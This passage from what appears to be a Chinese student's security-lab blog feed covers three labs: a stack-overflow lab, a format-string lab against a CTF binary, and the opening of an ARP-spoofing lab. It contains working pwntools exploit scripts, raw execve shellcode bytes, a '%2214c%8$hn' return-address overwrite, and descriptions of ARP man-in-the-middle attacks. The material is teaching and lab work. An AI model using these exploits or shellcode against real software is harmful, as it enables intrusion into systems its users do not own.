<p>这是输入一个字母 "a" 后，栈的相关情况。我们可以看到，RAX、RSI、RDI 寄存器中都推入了一个 "a" 的值 (<code>0x61</code>)</p>
 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/30.png" class="">
<p>而栈的情况也是向 <code>0x7fffffffde70</code> 处相应地有一个 <code>0x61</code> 的值，在栈相对位移的 <code>0x10</code> 处。 结合上图的 RIP 指针和下图的 <code>backtrace</code> 来看，下一步断点位将是在 <code>check_input</code> 偏移值 + 4 处。地址为 <code>0x4007a9</code> 处。</p>
 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/31.png" class="">
</li>
<li>
<p>按下<kbd> c</kbd> 键，继续执行程序。程序正常结束，代表正常经过了 <code>check_input</code> 过程。 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/32.png" class=""></p>
</li>
<li>
<p>如果继续运行程序，但是构造一个比较长的字符串时，寄存器的情况如下。</p>
 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/35.png" class="">
<p>此时 RDI 指向 "Detect bof!"，RIP 指向 <code>push</code> 函数的地址，在下方的栈显示中也看到 "a" 越过了 0048 的限制。</p>
 <img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/36.png" class="">
</li>
<li>
<p>先看 payload 的运行效果</p>
<img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/38.png" class="">
<div class="note info"><p>可以看到，switching to interactive mode 之后，有一个小的 <code>$</code> 号出现在 shell 的左侧，这是一个小 shell (<code>bin/sh</code>)，可以执行一些简单的命令，在 CTF 的 pwn 题中经常用于反弹 shell，获取 flag 文件。</p>
</div>
</li>
<li>
<p>接下来，调试一下 payload 输入，把它输入到 gdb 调试进程中。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/39.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/40.png" class=""></div></div></div>
<p>可以观察到输入的内容位于 RSI（<code>0x7fffffffde70</code>）中，在 RBP 中看到了 "/bin/sh" 的字样，这是 Linux 下的一种 shell。然后在栈中看到了被 “截断” 的序列 <code>\x00H1\xffH1</code>。中间隔离了一些内容后，下方被注入了 <code>bin/sh</code> 字符串。随后在 <code>puts</code> 调用时，<code>bin/sh</code> 被推到 RBP 上，在函数退出后，<code>bin/sh</code> 将会执行，中间的一些地址应当是 <code>bin/sh</code> 的地址。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/41.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/42.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/07/experiments/security/vulnerability_analysis/shellcode/43.png" class=""></div></div></div>
</li>
</ol>
<p>最终的 payload 代码如下所示</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p=remote()</span></span><br><span class="line">p=process(<span class="string">'./sc2'</span>)</span><br><span class="line"><span class="comment"># addr_egg = 0x400798</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">7</span>+<span class="string">"\x00"</span>+<span class="string">"\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"</span>+<span class="string">"b"</span>*<span class="number">5</span>+p64(<span class="number">0x400798</span>)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
<h2 id="实验难点及收获">实验难点及收获</h2>
<p>软件的使用方面，这次使用了 windbg 和 gdb 完成实验，其中 gdb 是第一次使用，操作比较陌生，不太熟练（主要是，不太适应命令行环境），但通过这一次的练习，我感受到它确实是一个功能非常强大的软件，可以在运行的同时实时查看堆栈的情况，还可以用来打印出重要函数的地址，方便 payload 使用它，是除 windbg 外个人接触的第一款 Linux 端调试软件。今后还会使用到 gdb 的更多命令，也会为 ctf 的 pwn 题打下充分的基础。</p>
<p>POC 的编写方面，作为 Python 的重度使用者，当然是选择使用 pwn 这个功能众多的 Python 库，以往看一些 CTF 比赛的 writeup 时，大多数的 pwn 题都用到了 pwn 来编写 payload，从实际使用上来说，pwntools 确实功能强大，就 pwn 题来说，可以根据操作系统版本生成不同的 shellcode，也可以用 elf 工具查看 got 表、plt 表地址，参加 CTF 比赛时也有交互功能，本身也提供很多实用的小工具。</p>
<h2 id="实验思考">实验思考</h2>
<h3 id="Pwn库中一些shellcraft-arch-os的运行结果和含义">Pwn 库中一些 shellcraft.arch.os 的运行结果和含义</h3>
<div class="note info"><p>资料来源于 <a href="http://docs.pwntools.com/en/stable/shellcraft.html">http://docs.pwntools.com/en/stable/shellcraft.html</a></p>
</div>
<div class="tabs" id="run_res"><ul class="nav-tabs"><li class="tab active"><a href="#run_res-1"><code>shellcraft.amd64.linux.sh</code></a></li><li class="tab"><a href="#run_res-2"><code>shellcraft.i386.linux.sh</code></a></li></ul><div class="tab-content"><div class="tab-pane active" id="run_res-1"><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/* execve(path='/bin///sh', argv=['sh'], envp=0) */</span><br><span class="line">/* push '/bin///sh\\x00' */</span><br><span class="line">push 0x68 mov</span><br><span class="line">rax, 0x732f2f2f6e69622f</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">/* push argument array ['sh\\x00'] */</span><br><span class="line">/* push 'sh\\x00' */</span><br><span class="line">push 0x1010101 ^ 0x6873</span><br><span class="line">xor dword ptr [rsp], 0x1010101 xor esi, esi</span><br><span class="line">/* 0 */</span><br><span class="line">push rsi</span><br><span class="line">/* null terminate */</span><br><span class="line">push 8 pop rsi</span><br><span class="line">add rsi, rsp push rsi</span><br><span class="line">/* 'sh\\x00' */</span><br><span class="line">mov rsi, rsp\n xor edx, edx</span><br><span class="line">/* 0 */</span><br><span class="line">/* call execve() */</span><br><span class="line">push SYS_execve</span><br><span class="line">/* 0x3b */</span><br><span class="line">pop rax syscall</span><br></pre></td></tr></tbody></table></figure>
<p>大体上来看，是利用函数指针来调取系统的 <code>sys_execve</code> 函数，传入 "bin/sh" 作为参数，最后引起调用</p></div><div class="tab-pane" id="run_res-2"><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/* execve(path='/bin///sh', argv=['sh'], envp=0) */</span><br><span class="line">/* push '/bin///sh\\x00' */</span><br><span class="line">push 0x68</span><br><span class="line">push 0x732f2f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx, esp</span><br><span class="line">/* push argument array ['sh\\x00'] */</span><br><span class="line">/* push 'sh\\x00\\x00' */</span><br><span class="line">push 0x1010101</span><br><span class="line">xor dword ptr [esp], 0x1016972</span><br><span class="line">xor ecx, ecx</span><br><span class="line">push ecx</span><br><span class="line">/* null terminate */</span><br><span class="line">push 4</span><br><span class="line">pop ecx</span><br><span class="line">add ecx, esp</span><br><span class="line">push ecx</span><br><span class="line">/* 'sh\\x00' */</span><br><span class="line">mov ecx, esp</span><br><span class="line">xor edx, edx</span><br><span class="line">/* call execve() */</span><br><span class="line">push SYS_execve</span><br><span class="line">/* 0xb */</span><br><span class="line">pop eax int 0x80</span><br></pre></td></tr></tbody></table></figure>
除了一些指令集的不同外，整体的效果和过程与 amd64 架构一致。</div></div></div>
<p>还有更多的架构和更多可运行的 shell 指令，这里就不一一列出了，今后的漏洞挖掘中可能还会利用到它们。</p>
]]></content>
      <categories>
        <category>实验</category>
        <category>漏洞分析</category>
        <category>漏洞</category>
        <category>缓冲区溢出</category>
        <category>二进制</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞</title>
    <url>/2019/11/14/experiments/security/vulnerability_analysis/string-format/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<p>掌握格式化字符串漏洞的原理以及在漏洞利用中的应用。</p>
<span id="more"></span>
<h2 id="步骤">步骤</h2>
<ol>
<li>
<p>运行程序，大概走一遍流程 </p><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/1.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/2.png" class=""></div></div></div><p></p>
</li>
<li>
<p>首先，程序接受最大 20 字节长的 “用户名” 和 “密码” 传入，注册成功后，会有三个选项：查看信息，修改信息和退出。</p>
</li>
<li>
<p>用 ida 打开程序，搜索相关标志，发现程序首先调用了 <code>sub_4008BB()</code>，它输出了我们看到的 <code>banner</code>，并冲洗了标准输出（通过调用 <code>fflush(stdout)</code>）。 <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/3.png" class=""></p>
</li>
<li>
<p>从 <code>sub4008bb</code> 跟回到 <code>main</code> 函数，发现接下来是一个 “注册” 过程，由 <code>sub_400903</code> 函数负责。</p>
 <figure class="highlight c"><figcaption><span>sub_400903</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int8 v12; <span class="comment">// [rsp+1Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Register Account first!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Input your username(max lenth:20): "</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">v12 = read(<span class="number">0</span>, &amp;bufa, <span class="number">0x14</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( v12 &amp;&amp; v12 &lt;= <span class="number">0x14</span>u )</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your password(max lenth:20): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;a9 + <span class="number">4</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_QWORD *)buf = bufa;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">8</span>) = a8;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">16</span>) = a9;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">24</span>) = a10;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">32</span>) = a11;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">  LOBYTE(bufa) = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"error length(username)!try again"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_QWORD *)buf = bufa;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">8</span>) = a8;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">16</span>) = a9;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">24</span>) = a10;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">32</span>) = a11;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> buf;</span><br></pre></td></tr></tbody></table></figure>
<p>使用 <code>read</code> 函数只将 20 字节数据读入，除此以外，所有的 <code>puts</code> 和 <code>read</code> 后都跟着一个 <code>fflush</code>，强行冲洗缓冲区。看来，缓冲区的毛病应该利用不上了。</p>
</li>
<li>
<p>接下来是 <code>sub_400d2b</code> 函数，这是程序的后半部分 —— 选择输出、修改信息或退出程序。</p>
 <figure class="highlight c"><figcaption><span>sub_400d2b</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v8 = sub_400A75();</span><br><span class="line">    <span class="keyword">switch</span> ( v8 )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        sub_400B41((__int64)&amp;sa, <span class="number">0LL</span>, v9, v10, v11);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> sub_400D1A(v7, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        sub_400B07((<span class="type">char</span>)v7, <span class="number">0</span>, v9, v10, v11, v12);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"error options"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    v7 = <span class="built_in">stdout</span>;</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>其中 <code>sub_400a75</code> 输出了三个选项的内容  <figure class="highlight c"><figcaption><span>sub_400a75</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"1.Sh0w Account Infomation!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"2.Ed1t Account Inf0mation!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"3.QUit sangebaimao:("</span>);</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><code>sub_400b41</code>（选择 2）修改已注册用户名的信息  <figure class="highlight c"><figcaption><span>sub_400b41</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"please input new username(max lenth:20): "</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">v15 = read(<span class="number">0</span>, &amp;buf, <span class="number">0x12C</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( v15 &lt;= <span class="number">0</span> || v15 &gt; <span class="number">20</span> )</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"len error(max lenth:20)!try again.."</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_QWORD *)s = sa;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">8</span>) = a8;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">16</span>) = desta;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">24</span>) = a10;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">32</span>) = a11;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">  <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;sa, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please input new password(max lenth:20): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v14 = read(<span class="number">0</span>, &amp;src, <span class="number">0x12C</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v14 &amp;&amp; v14 &lt;= <span class="number">0x14</span>u )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span> *)&amp;desta + <span class="number">4</span>, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">    sub_400AE5(&amp;src, <span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)&amp;desta + <span class="number">4</span>, &amp;src, v14);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    *(_QWORD *)s = sa;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">8</span>) = a8;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">16</span>) = desta;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">24</span>) = a10;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">32</span>) = a11;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"len error(max lenth:10)!try again.."</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    *(_QWORD *)s = sa;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">8</span>) = a8;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">16</span>) = desta;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">24</span>) = a10;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">32</span>) = a11;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
</li>
<li><code>sub_400D1A</code>（选择 3）输出了退出信息</li>
<li><code>sub_400B07</code>（选择 1）输出了用户的信息  <figure class="highlight c"><figcaption><span>sub_400b07</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">write(<span class="number">0</span>, <span class="string">"Welc0me to sangebaimao!\n"</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line marked"><span class="built_in">printf</span>(&amp;formata, <span class="string">"Welc0me to sangebaimao!\n"</span>);</span><br><span class="line marked"><span class="keyword">return</span> <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;a9 + <span class="number">4</span>);</span><br></pre></td></tr></tbody></table></figure>
<ul>
<li>显然此处存在格式化字符串漏洞，在输出用户名和密码时都使用了 <code>printf(buf)</code> 的格式。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>确定保护</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file pwnme_k0</span><br></pre></td></tr></tbody></table></figure>
 <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/5.png" class="">
<ul>
<li>本题开启了 RELRO 保护，将不能对 GOT 表进行写操作，但可以通过覆写返回地址获取 shell。采用的思路是：先泄露出返回地址字段的位置，然后利用 <code>%n</code> 实现覆写。</li>
</ul>
</li>
<li>
<p>开始利用</p>
<ul>
<li>
<p>在 <code>4008a6</code> 处找到了 <code>/bin/sh</code> 字符串，结合下方的 call system，这里实现了一个完整的 <code>system('/bin/sh')</code>，因此只要把返回地址写成这个地址就可以了。</p>
 <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/6.png" class="">
</li>
<li>
<p>那么，返回地址在哪里呢？就从那个有漏洞的 <code>sub_400b07</code> 下手。</p>
</li>
</ul>
</li>
<li>
<p>在 <code>0x400b28</code> 的 <code>printf</code> 上下断点</p>
 <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/7.png" class=""> <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/8.png" class="">
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/9.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/10.png" class=""></div></div></div>
</li>
<li>
<p><code>call 0x400770</code> 应该是 <code>printf</code> 的地址，stack 中，栈顶是 rbp，第二个是返回地址 <code>0x400d74</code>，第三个是代表用户名的字符串 <code>aaa</code>，<code>printf</code> 的参数。又因为 64 位系统中，函数前六个参数分别放在寄存器 RDI，RSI，RDX，RCX，R8 和 R9 上，除了存放格式化字符串的 rdi 参数，栈顶元素应该在第 5+1=6 个位置上（越过 R9）。从 rbp 的输出可以计算出返回地址偏移为 0x7fffffffddc0-0x7fffffffdd80+8 (64 位系统的一个存储块为 8 个字节)=0x48。设置 <code>username</code> 为 <code>%6$p</code> 即可获取栈顶元素内容，减掉偏移 <code>0x48</code> 得到返回地址在栈中位置</p>
 <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/11.png" class="">
</li>
<li>
<p>下一步修改，需要利用 <code>edit</code> 函数将 <code>username</code> 修改为返回地址在栈中的地址，<code>password</code> 修改为用于攻击的格式化字符串。<code>username</code> 是格式化字符串的第 8 个参数，通过 <code>%8$hn</code> 向第 8 个参数所指向的位置中写入 <code>0x08a6</code>(十进制为 <code>2214</code>) 两个字节实现对返回地址的覆写</p>
</li>
<li>
<p>最终利用 payload 如下所示，为方便理解，对于一些操作做了封装。</p>
<figure class="highlight python"><figcaption><span>payload.py</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">   <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">   context.log_level=<span class="string">'debug'</span></span><br><span class="line">   p = process(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username,password</span>):</span><br><span class="line">    p.recvuntil(<span class="string">"Input your username(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(username)</span><br><span class="line">    p.recvuntil(<span class="string">"Input your password(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">username,password</span>):</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"please input new username(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(username)</span><br><span class="line">    p.recvuntil(<span class="string">"please input new password(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">debugs=(<span class="params"><span class="literal">True</span>,<span class="literal">True</span></span>)</span>):</span><br><span class="line">    <span class="comment"># return-addr:0x400d74 -&gt; system:0x4008a6</span></span><br><span class="line">	<span class="comment"># libc = ELF('libc.so')</span></span><br><span class="line">	debug1,debug2=debugs</span><br><span class="line">	register(<span class="string">"%6$p"</span>,<span class="string">"bbb"</span>)</span><br><span class="line">	offset = <span class="number">0x7fffffffddc0</span> - <span class="number">0x7fffffffdd80</span> + <span class="number">8</span></span><br><span class="line">	show()</span><br><span class="line">	stack_top = <span class="built_in">int</span>(p.recvline()[<span class="number">2</span>:<span class="number">14</span>],<span class="number">16</span>)</span><br><span class="line">	return_addr = stack_top-offset</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"[*]stack top:0x%x"</span>%stack_top</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"[*]offset:0x%x"</span>%offset</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"[*]return_addr in stack:0x%x"</span>%return_addr</span><br><span class="line">	<span class="keyword">if</span> debug1:</span><br><span class="line">		gdb.attach(p,<span class="string">'b *0x400b28'</span>)</span><br><span class="line">		quit()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		edit(username=p64(return_addr),password=<span class="string">"%2214c%8$hn"</span>)</span><br><span class="line">		<span class="comment"># 2114 is the decimal value of 0x08a6</span></span><br><span class="line">		<span class="keyword">if</span> debug2:</span><br><span class="line">			gdb.attach(p,<span class="string">'b *0x400b28'</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			show()</span><br><span class="line">		p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    solve(debugs=(<span class="literal">False</span>,<span class="literal">False</span>))</span><br><span class="line">   </span><br></pre></td></tr></tbody></table></figure>
</li>
</ol>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/%E6%9C%80%E7%BB%881.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/%E6%9C%80%E7%BB%882.png" class=""></div></div></div>
<h2 id="实验难点与收获">实验难点与收获</h2>
<p>本次实验的难点在于漏洞的利用，如何构造出 “致命” 的格式化字符串是最难的地方。格式化字符串漏洞的利用点不难分析，它利用了 <code>printf</code> 的格式化字符与参数数量不匹配的毛病，泄露内存地址，从而计算出一些信息。类似于 <code>printf(buf)</code> 的形式很容易输出程序地址信息，更可能引起内存覆写。</p>
<p><code>%n</code> 是格式化字符串漏洞的关键，它完成了将所输入的内容直接写入内存地址空间的操作。基本上可以说是 pwn 中 getshell 前的最后一步。</p>
<p>在写漏洞利用脚本时需要注意各种小问题，比如不可直接书写地址，地址的大小端，数据的进制，<code>recv</code> 和 <code>recvline</code> 的区别等。经过几轮调试后，终于写成了可以用的脚本。</p>
<h2 id="实验思考">实验思考</h2>
<p>上述脚本中，“向第 8 个参数所指向的位置写东西” 使用的格式化字符为 <code>%8$hn</code>，而课件上和课上讲的是 <code>$hhn</code>，这两个有什么区别？</p>
<blockquote><p><code>%$hn</code> 表示写入的地址空间为 2 字节，<code>%$hhn</code> 表示写入的地址空间为 1 字节，<code>%$lln</code> 表示写入的地址空间为 8 字节，在 32bit 和 64bit 环境下一样。有时，直接写 4 字节 <code>%n</code> 会导致程序崩溃或等候时间过长，可以通过 <code>%$hn</code> 或 <code>%$hhn</code> 来适时调整。</p>
<footer><strong>Yable 的格式化字符串利用小结 </strong><cite><a href="https://www.cnblogs.com/Yable/p/7895732.html">www.cnblogs.com/Yable/p/7895732.html</a></cite></footer></blockquote>
]]></content>
      <categories>
        <category>实验</category>
        <category>漏洞分析</category>
        <category>漏洞</category>
        <category>格式化字符串</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ARP 欺骗</title>
    <url>/2019/09/28/experiments/security/web/arp/</url>
    <content><![CDATA[<h2 id="目标">目标</h2>
<p>尝试一次本地 ARP 欺骗攻击，掌握 ARP 协议及其利用。学会使用 ARP 攻击工具并进行分析。</p>
<span id="more"></span>
<div class="note danger"><p>本篇文章为实验记录，仅供交流学习使用，切勿违法应用，所有文中提到的工具不提供下载。</p>
</div>
<h2 id="原理">原理</h2>
<h3 id="ARP协议">ARP 协议</h3>
<p>在网络中，每台主机会有一个 MAC 地址，而每个网络位置会有一个专属于它的 IP 地址。ARP 协议是将 IP 地址解析为 MAC（硬件地址）的协议。IP 地址和 MAC 地址不存在任何简单的映射关系，网络中的主机也在不停变化中，映射关系在不断改变，ARP 协议利用了主机的高速缓冲，维护了一个从 IP 地址到硬件地址的映射表，这个映射表在动态更新。</p>
<p>若主机 A 要与主机 B 通信，首先会从主机 A 的缓冲中寻找 B 的 IP 地址，如果有，就查出 B 对应的 MAC 地址。若无，就在局域网中广播 ARP 请求（其中有 B 的地址），所有主机都会收到该请求。B 主机收到以后，向 A 主机回复 IP 地址。B 主机也会记录下 A 的 IP 地址和 MAC 地址，以便之后双方高速通信。</p>
<h3 id="ARP欺骗攻击">ARP 欺骗攻击</h3>
<p>ARP 高速缓存根据所接收到的 ARP 协议包随时进行动态更新，它是无状态的协议，不会检查自己是否发过请求包，只要收到目标 MAC 是自己的 ARP 响应数据包或 ARP 广播包，都会接受并缓存。<br>
ARP 协议没有认证机制，只要接收到的协议包是有效的，主机就无条件地根据协议包的内容刷新本机 ARP 缓存，并不检查该协议包的合法性。 因此攻击者可以随时发送虚假 ARP 包更新被攻击主机上的 ARP 缓存，进行地址欺骗或拒绝服务攻击。</p>
<h3 id="ARP欺骗攻击的类型">ARP 欺骗攻击的类型</h3>
<ul>
<li>拒绝服务攻击：构造响应包，指定协议地址为关键服务的 IP 地址，而 MAC 地址为不存在的虚拟地址。这样，局域网转发给关键服务的数据包都会丢失（因为对应物理地址不存在）。</li>
<li>广播攻击：构造响应包，其中协议地址为网关 IP，而 MAC 地址为广播地址。如此，所有发往网关的数据包都将被广播出来，可能会占用过大带宽，干扰服务，也会泄露局域网结构。</li>
<li>MAC 洪泛攻击：攻击者与目标机连接在同一个集线器时，可以将网卡设置为混杂模式，从而能够接收所有经过它的数据流，而不论其目的地址是否是它。当其在交换机不同的端口时，攻击者可向交换机发送大量不同源 MAC 地址的数据包，使得交换机内存不足以存放正确的 MAC 地址和物理端口号的映射关系。交换机降级为集线器模式，从而可以继续使用广播攻击嗅探网络结构。</li>
<li>中间人攻击：攻击者向目标发送虚假应答包，告诉主机 A“主机 B 的 MAC 地址是 MacC（攻击者 MAC）”，告诉主机 B“主机 A 的 MAC 地址是 MacC（攻击者 MAC）”，此时 A 和 B 间通信的数据均被 C 嗅探，而 A 和 B 不能得知这一点（C 会将数据正确地重定向至正确位置）。</li>
</ul>
<h2 id="实验过程">实验过程</h2>
<h3 id="使用ARP攻击工具攻击">使用 ARP 攻击工具攻击</h3>
<div class="note info"><p>本实验使用 WinArpAttacker3.7.0 版完成。监测机的两块网卡分别为：192.168.235.1 00-50-56-C0-00-08 192.168.17.1 00-50-56-C0-00-01</p>
<p>操作系统为 Windows 10 64Bit。</p>
</div>
<h4 id="禁止上网">禁止上网</h4>
<div class="note warning"><p>目标机 (A) 地址为 192.168.235.133 00-0C-29-E7-58-4D</p>
<p>操作系统 windows2000。</p>
</div>
